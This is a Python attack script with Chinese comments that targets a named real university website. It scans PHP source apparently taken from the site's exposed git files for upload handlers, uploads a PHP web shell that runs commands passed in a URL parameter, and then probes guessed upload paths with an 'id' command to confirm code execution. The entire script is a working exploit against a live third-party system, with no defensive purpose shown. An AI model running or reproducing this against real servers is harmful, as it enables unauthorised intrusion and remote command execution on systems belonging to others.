#!/usr/bin/env python3
import requests
import urllib3
import re
import os
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

base_url = "https://olympic.su.ac.th"
output_dir = "/tmp/git_php_files"

print("[*] 测试文件上传漏洞...")

# 从下载的文件中提取上传功能
upload_files = []
for root, dirs, files in os.walk(output_dir):
    for file in files:
        if file.endswith('.php'):
            file_path = os.path.join(root, file)
            with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                content = f.read()
            
            if 'move_uploaded_file' in content or '$_FILES' in content:
                # 提取文件路径
                rel_path = file_path.replace(output_dir + '/', '').replace('_', '/')
                if rel_path.startswith('enmeeting/'):
                    upload_files.append(rel_path)
                    files_params = re.findall(r'\$_FILES\[["\']([^"\']+)["\']\]', content)
                    upload_paths = re.findall(r'move_uploaded_file\([^,]+,\s*["\']([^"\']+)["\']', content)
                    print(f"[+] {rel_path}")
                    print(f"    FILES参数: {files_params}")
                    print(f"    上传路径: {upload_paths}")

# 测试上传
shell_content = "<?php system($_GET['c']); ?>"
for upload_file in upload_files:
    web_path = f"/{upload_file}"
    print(f"\n[*] 测试 {web_path}...")
    
    # 尝试所有可能的参数名
    files_params = ['file', 'upload', 'file_upload', 'attachment', 'image']
    for param in files_params:
        files = {param: ('shell.php', shell_content, 'application/x-php')}
        data = {'submit': 'upload', 'upload': '1'}
        
        resp = requests.post(f"{base_url}{web_path}", files=files, data=data, verify=False, timeout=5)
        
        if 'success' in resp.text.lower() or 'uploaded' in resp.text.lower():
            print(f"[+] {web_path} 参数 {param} 上传可能成功")
            
            # 检查上传位置
            test_locations = [
                f"/enmeeting/shell.php?c=id",
                f"/enmeeting/uploads/shell.php?c=id",
                f"/enmeeting/upload/shell.php?c=id",
                f"/enmeeting/files/shell.php?c=id",
            ]
            
            for loc in test_locations:
                test_resp = requests.get(f"{base_url}{loc}", verify=False, timeout=5)
                if 'uid=' in test_resp.text:
                    print(f"[+] Shell获取成功: {loc}")
                    exit(0)

print("\n[+] 上传测试完成")
